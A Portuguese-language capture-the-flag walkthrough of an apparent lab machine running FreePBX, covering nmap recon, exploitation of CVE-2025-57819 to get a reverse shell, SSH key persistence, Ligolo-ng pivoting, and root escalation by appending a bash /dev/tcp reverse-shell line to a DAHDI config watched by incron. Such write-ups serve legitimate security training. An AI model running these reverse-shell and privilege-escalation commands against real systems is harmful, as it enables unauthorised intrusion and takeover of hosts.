#ctfs 

# Coleta de Informações

Primeiro começamos com um scan via `nmap`de todas as portas ativas.

```shell
└─$ nmap 10.129.245.100 -Pn --open -sC -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 10:02 -03
Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 57.65% done; ETC: 10:09 (0:02:36 remaining)
Nmap scan report for 10.129.245.100
Host is up (0.20s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  https
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request

Nmap done: 1 IP address (1 host up) scanned in 359.65 seconds
```

Temos um SSH, um HTTP e um HTTPs abertos, podemos fazer uma coleta de informações um pouco mais aprofundada nessas portas

```shell
└─$ nmap 10.129.245.100 -Pn --open -sC -p 80,443 --script="http-enum,http-methods,http-title,http-vuln*" -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 10:14 -03
Nmap scan report for 10.129.245.100
Host is up (0.16s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to https://dbhsqqqj/admin/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.75 seconds
```

Temos dois domínios associados a tal IP. `http://connected.htb/`e `https://dbhsqqqj/admin/`. Vamos adicionar no nosso roteamento estático de `/etc/hosts` as rotas e tentar novamente rodar o scan

# Enumeração

## Porta 80

Ao colarmos o link no navegador encontramos a seguinte página

![Página inicial do FreePBX](./Imagens/Pasted%20image%2020260929103515.png)

É um FreePBX da versão 16.0.40.7, ao pesquisarmos a versão na internet encontramos o [CVE-2025-57819](https://www.exploit-db.com/exploits/52681)
# Exploração

Vamos executá-lo

```shell
└─$ python3 exploit.py -u http://connected.htb/ --lhost [meu IP] --lport 4444
CVE-2025-57819 • FreePBX Unauth SQLi → RCE
Coded By: K3ysTr0K3R (Jared Brits)
Need a hug? ʕっ•ᴥ•ʔっ

[*] Target locked: http://connected.htb/
[-] Listener deployment failed: [Errno 98] Address already in use
[+] Exploit path confirmed!
[*] Injecting payload into cron schedule...
[+] Payload planted successfully (server response: 500)
[*] Awaiting trigger activation (cron will fire within ~60 seconds)...
[*] Backdoor callback expected from [meu IP]:4444 in the next 60–90 seconds...
```

Deixando o listener ligado, em alguns segundos recebi a conexão reversa

```shell
└─$ nc -lvnp 4444        
listening on [any] 4444 ...
connect to [meu IP] from (UNKNOWN) [10.129.245.100] 52012
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:8E:F4:C8 | 10.129.245.100            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ id
id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ 
```

Rapidamente conseguimos a flag de usuário

```shell
[asterisk@connected ~]$ ls -la
ls -la
total 28
drwxr-xr-x. 10 asterisk asterisk 274 Jun  4 11:23 .
drwxr-xr-x.  3 root     root      22 May 21 07:50 ..
-rw-------   1 asterisk asterisk  13 Jun  4 11:24 .asterisk_history
-rw-------   1 asterisk asterisk   8 Jun  4 11:24 .bash_history
-rw-r--r--.  1 asterisk asterisk  18 Dec  6  2016 .bash_logout
-rw-r--r--.  1 asterisk asterisk 193 Dec  6  2016 .bash_profile
-rw-r--r--.  1 asterisk asterisk 231 Dec  6  2016 .bashrc
drwxrwxr-x   3 asterisk asterisk  18 Jun  4 11:23 .cache
drwxr-xr-x.  4 asterisk asterisk  37 Jun  4 11:23 .config
drwxrwxr-x.  2 asterisk asterisk  83 Nov 30  2025 .gnupg
drwxr-xr-x.  4 asterisk asterisk  28 Nov 30  2025 .node
drwxr-xr-x.  3 asterisk asterisk  20 Nov 30  2025 .node-gyp
drwxr-xr-x.  5 asterisk asterisk  86 Nov 30  2025 .npm
-rw-r--r--.  1 asterisk asterisk  18 Nov 30  2025 .npmrc
-rw-r--r--   1 asterisk asterisk   0 May 19 18:41 .odbc.ini
drwxr-xr-x.  3 asterisk asterisk  17 Nov 30  2025 .package_cache
drwxrwxr-x.  5 asterisk asterisk 165 Nov 30  2025 .pm2
-rw-r-----   1 root     asterisk  33 Sep 29 12:57 user.txt
```

```shell
[asterisk@connected ~]$ cat user.txt
cat user.txt
[flag user.txt]
```

# Pós-exploração

Quando iniciei os comandos para começar a pós-exploração percebi que o alvo tinha limitação de shell

```shell
[asterisk@connected tmp]$ ifconfig
ifconfig
bash: ifconfig: command not found
```

Portanto, decidi que deveria implantar uma key SSH no usuário `asterisk`de modo a ter uma shell mais estável. Com isso, estabeleci uma conexão, não mais reversa e sim via SSH

```shell
└─$ ssh -i id_pwn asterisk@10.129.245.100
The authenticity of host '10.129.245.100 (10.129.245.100)' can't be established.
ED25519 key fingerprint is: SHA256:kWGrg0c6rDkZLkc7W/GBbJxcblUiM7agatveQeq3YX0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.245.100' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
```

Daí, o comando funcionou

```shell
[asterisk@connected ~]$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.245.100  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::82bd:1bcb:a990:dd3b  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:8e:f4:c8  txqueuelen 1000  (Ethernet)
        RX packets 157325  bytes 17657360 (16.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8535  bytes 6932352 (6.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Loopback Local)
        RX packets 12987  bytes 36780942 (35.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12987  bytes 36780942 (35.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Posso verificar se tem portas em loopback abertas no alvo

```shell
[asterisk@connected ~]$ netstat -nlpt
(Nem todos os processos puderam ser identificados, informações sobre processos
 de outrem não serão mostrados, você deve ser root para vê-los todos.)
Conexões Internet Ativas (sem os servidores)
Proto Recv-Q Send-Q Endereço Local          Endereço Remoto         Estado      PID/Program name    
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               OUÇA       -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               OUÇA       -                   
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               OUÇA       -                   
tcp        0      0 127.0.0.1:5038          0.0.0.0:*               OUÇA       1307/asterisk       
tcp        0      0 0.0.0.0:22              0.0.0.0:*               OUÇA       -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               OUÇA       -                   
tcp        0      0 127.0.0.1:4000          0.0.0.0:*               OUÇA       -                   
tcp6       0      0 :::80                   :::*                    OUÇA       -                   
tcp6       0      0 :::22                   :::*                    OUÇA       -                   
tcp6       0      0 ::1:25                  :::*                    OUÇA       -                   
tcp6       0      0 :::443                  :::*                    OUÇA       -        
```

Temos algumas portas interessantes no alvo. Para analisar também os serviços disponíveis apenas em sua interface de loopback, utilizaremos o Ligolo-ng. A ferramenta reserva o endereço `240.0.0.1` para representar o `127.0.0.1` da máquina onde o agente está sendo executado.

Primeiro, criamos e ativamos a interface TUN em nossa máquina:

```bash
sudo ip tuntap add user pentecostes mode tun ligolo
sudo ip link set ligolo up
sudo ip route replace 240.0.0.1/32 dev ligolo
```

No console do Ligolo, selecionamos a sessão do agente e iniciamos o túnel:

```text
session
start --tun ligolo
```

Podemos confirmar que a rota foi configurada corretamente com:

```bash
ip route get 240.0.0.1
```

A saída deve indicar que o tráfego destinado a `240.0.0.1` será encaminhado pela interface `ligolo`:

```text
240.0.0.1 dev ligolo
```

Por fim, realizamos uma varredura via `nmap` no endereço especial:

```bash
└─$ nmap --open -Pn -p- 240.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 13:25 -03
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.15% done; ETC: 13:26 (0:00:03 remaining)
Nmap scan report for 240.0.0.1
Host is up (0.20s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
4000/tcp  open  remoteanything
5038/tcp  open  unknown
6379/tcp  open  redis
27017/tcp open  mongod

Nmap done: 1 IP address (1 host up) scanned in 50.01 seconds
```

Vamos melhorar esse escaneamento verificando as versões dos serviços encontrados

```shell
└─$ nmap --open -Pn -p 22,25,80,443,3306,4000,5038,6379,27017 -sV 240.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 13:27 -03
Nmap scan report for 240.0.0.1
Host is up (1.3s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp   open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
3306/tcp  open  mysql    MariaDB 5.5.65
4000/tcp  open  http     aiohttp 2.2.4 (Python 3.6)
5038/tcp  open  asterisk Asterisk Call Manager 9.0.0
6379/tcp  open  redis    Redis key-value store 3.2.12
27017/tcp open  mongodb  MongoDB 2.6.12
Service Info: Host:  connected.localdomain

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.46 seconds
```

Observe que temos um serviço chamado `asterisk`, que é correspondente ao nome de nosso usuário. Podemos ver se achamos algo nos `incron` do sistema

```shell
[asterisk@connected incron.d]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

Observe a linha do **/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart**, o que ela significa? Basicamente significa que se alguém terminar de escrever e fechar o `dahdi_restart`, deve-se executar o `/usr/sbin/sysadmin_dahdi_restart`. Vamos fazer o seguinte, vamos injetar um script malicioso em `init.conf` e, em seguida, fechar o programa para executar.

```shell
echo "bash -c 'bash -i >& /dev/tcp/10.10.17.151/4545 0>&1'" >> /etc/dahdi/init.conf
```

Payload injetado no arquivo de configuração, vamos abrir um listener em nossa máquina e reiniciar o `dahdi`

```shell
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```

Eis que veio a conexão reversa

```shell
[root@connected /]# whoami
whoami
root
```

Basta ler a flag de root

```shell
[root@connected root]# cat root.txt
cat root.txt
[flag root.txt]
```
